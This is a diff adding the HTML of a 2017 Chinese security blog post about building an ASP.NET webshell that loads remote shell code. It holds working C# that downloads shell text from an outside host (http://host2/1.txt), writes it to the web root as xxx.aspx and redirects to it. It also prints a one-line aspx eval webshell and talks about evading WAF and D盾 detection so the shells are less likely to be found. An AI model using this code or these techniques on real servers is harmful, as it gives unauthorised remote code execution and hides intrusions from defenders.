@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="最近完善biubiubiu的shell部分，在写asp.net的时候遇到不能像php那种能够先定义包含文件参数，再include+参数形式那样动态包含文件，记录下这个问题。"/>
+
+
+
+
+  <meta name="keywords" content="Hexo, Blog" />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Bypass.World">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2017/02/NET动态include的问题记录/"/>
+
+
+<meta name="description" content="最近完善biubiubiu的shell部分，在写asp.net的时候遇到不能像php那种能够先定义包含文件参数，再include+参数形式那样动态包含文件，记录下这个问题。">
+<meta name="keywords" content="Hexo, Blog">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ASP.NET动态include的问题记录">
+<meta property="og:url" content="http://yoursite.com/2017/02/NET动态include的问题记录/index.html">
+<meta property="og:site_name" content="Bypass.World">
+<meta property="og:description" content="最近完善biubiubiu的shell部分，在写asp.net的时候遇到不能像php那种能够先定义包含文件参数，再include+参数形式那样动态包含文件，记录下这个问题。">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2017-09-19T17:19:57.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ASP.NET动态include的问题记录">
+<meta name="twitter:description" content="最近完善biubiubiu的shell部分，在写asp.net的时候遇到不能像php那种能够先定义包含文件参数，再include+参数形式那样动态包含文件，记录下这个问题。">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?686eedfda259ce1d887831c94f49f99f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  <script type="text/javascript">
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-106734017-1', 'auto');
+        ga('send', 'pageview');
+  </script>
+
+
+
+    <title> ASP.NET动态include的问题记录 - Bypass.World </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Bypass.World</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          ASP.NET动态include的问题记录
+        
+      </h1>
+
+      <time class="post-time">
+          Feb 23 2017
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>用C#写的aspx马，需要实现动态包含任意可达网页或ftp的aspx-shell，如访问<code>http://host1/s.php?shell=http://host2/1.txt</code>能够实现在host1上包含host2/1.txt这个shell。在php不同的版本中，可以用include直接包含远程文件，fopen、file_get_contents等读取远程文件，以eval方法执行等方式来实现执行远程服务器上的字符串或shell。想要在aspx上实现这一用法。</p>
+<h3 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h3><p>搜索得知ASP.NET自带的包含语句：<code>&lt;!--#include file=&quot;xxx.aspx&quot;--&gt;</code>,但是尝试如下代码报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">string file=&quot;xxx.aspx&quot;;</div><div class="line">&lt;!--#include file=file--&gt;</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">分析器错误</div><div class="line">说明: 在分析向此请求提供服务所需资源时出错。请检查下列特定分析错误详细信息并适当地修改源文件。</div><div class="line"></div><div class="line">分析器错误消息: 未能找到文件“C:\xampp\www_asp\file”。</div></pre></td></tr></table></figure>
+<p>提示未发现file文件,因此无法直接以参数形式带入include。</p>
+<p>想到的另外一种方法就是直接获取远程文件保存到本地，再继续包含，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;</div><div class="line">&lt;%@ Import Namespace=&quot;System.Net&quot; %&gt;</div><div class="line">&lt;script Language=&quot;C#&quot; runat=&quot;server&quot;&gt;</div><div class="line">//获取远程Url文本保存为字符串；</div><div class="line">public string GetHttpData(string Url)&#123;</div><div class="line">	string sException=null;</div><div class="line">	string sRslt=null;</div><div class="line">	WebResponse oWebRps=null;</div><div class="line">	WebRequest oWebRqst=WebRequest.Create(Url);</div><div class="line">	oWebRqst.Timeout=50000;</div><div class="line">	try&#123;</div><div class="line">		oWebRps=oWebRqst.GetResponse();</div><div class="line">	&#125;</div><div class="line">	catch(WebException e)&#123;</div><div class="line">		sException=e.Message.ToString();</div><div class="line">		Response.Write(sException);</div><div class="line">	&#125;</div><div class="line">	catch(Exception e)&#123;</div><div class="line">		sException=e.ToString();</div><div class="line">		Response.Write(sException);</div><div class="line">	&#125;</div><div class="line">	finally&#123;</div><div class="line">		if(oWebRps!=null)&#123;</div><div class="line">			StreamReader oStreamRd=new StreamReader(oWebRps.GetResponseStream(),Encoding.GetEncoding(&quot;UTF-8&quot;));</div><div class="line">			sRslt=oStreamRd.ReadToEnd();</div><div class="line">			oStreamRd.Close();</div><div class="line">			oWebRps.Close();</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	return sRslt;</div><div class="line">&#125;</div><div class="line">//将字符串写入文本；</div><div class="line">public void WriteTxt(string filename,string data)&#123;</div><div class="line">	string file = HttpContext.Current.Request.PhysicalApplicationPath+filename;</div><div class="line">	StreamWriter sw;//写</div><div class="line">	FileStream fswrite;//写流</div><div class="line">	if (!File.Exists(file))&#123;</div><div class="line">		sw = File.CreateText(file);</div><div class="line">		Response.Write(&quot;create file: &quot;+file);</div><div class="line">		sw.Close();</div><div class="line">		fswrite = new FileStream(file, FileMode.Create, FileAccess.Write);</div><div class="line">		sw = new StreamWriter(fswrite, Encoding.GetEncoding(&quot;utf-8&quot;));</div><div class="line">		sw.WriteLine(data);</div><div class="line">		sw.Close();</div><div class="line">		fswrite.Close();</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;%WriteTxt(HttpContext.Current.Request.PhysicalApplicationPath+&quot;xxx.aspx&quot;,GetHttpData(&quot;http://host2/1.txt&quot;));%&gt;</div><div class="line">&lt;!--#include file=&quot;xxx.aspx&quot;--&gt;</div></pre></td></tr></table></figure>
+<p>信心满满的去访问刚写好的页面，结果仍然报错：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">分析器错误</div><div class="line">说明: 在分析向此请求提供服务所需资源时出错。请检查下列特定分析错误详细信息并适当地修改源文件。</div><div class="line">分析器错误消息: 未能找到文件“C:\xampp\www_asp\xxx.aspx”。</div></pre></td></tr></table></figure>
+<p>仍然是未找到xxx.aspx文件，测试两个函数都没问题，正常都能写入文件。多次测试发现特喵asp.net无论怎样都会优先执行include函数！！！<br>也就是说无论前面铺垫再多，include都会优先执行，然后检测到文件不存在，报错，结束执行！！！</p>
+<h3 id="忽悠"><a href="#忽悠" class="headerlink" title="忽悠"></a>忽悠</h3><p>一种忽悠人的解决办法就是，获取远程网页保存到本地xxx.aspx文件，然后跳转到写入的shell页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;%</div><div class="line">WriteTxt(HttpContext.Current.Request.PhysicalApplicationPath+&quot;xxx.aspx&quot;,GetHttpData(&quot;http://host2/1.txt&quot;));</div><div class="line">Response.Redirect(&quot;xxx.aspx&quot;, false);</div><div class="line">%&gt;</div></pre></td></tr></table></figure></p>
+<p>上面代码确实是实现了在本地执行远程shell。但是这样会给服务器上写入不少shell，很容易被发现。</p>
+<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>最好的办法就是不保存文本，直接保存字符串，在.net环境下执行字符串。那么问题来了目前aspx页面执行字符串，最常见的方法是Jscript中eval()执行，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</div></pre></td></tr></table></figure></p>
+<p>即是常见的aspx一句话，测试的时候又遇到了另外一个问题，那就是原来获取网页和保存文件都是C#语言编译的，但是eval语句是Jscript编译的，一个网页不能同时使用两种编译方式，否则就会报错。</p>
+<p>问题先记录下来，有时间研究下Jscript，看看能不能Jscript重写下试试。但是aspx不存在和php一样的动态函数，执行eval函数的时候必定会被waf检测到，目前只有<code>忽悠</code>这一步的解决方案能改完美过D盾。不管了，先实现功能，后续再折腾过狗吧。</p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/免杀/">免杀</a>
+		  
+			<a href="/tags/shell/">shell</a>
+		  
+			<a href="/tags/aspx/">aspx</a>
+		  
+			<a href="/tags/biubiubiu/">biubiubiu</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2017/03/zoomeye批量采集struts漏洞url/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">zoomeye采集struts url</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2017/02/python3-test1-scan/">
+        <span class="next-text nav-default">python3-test1-scan.py</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2017
+    <span class="footer-author">Norman.Chew.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
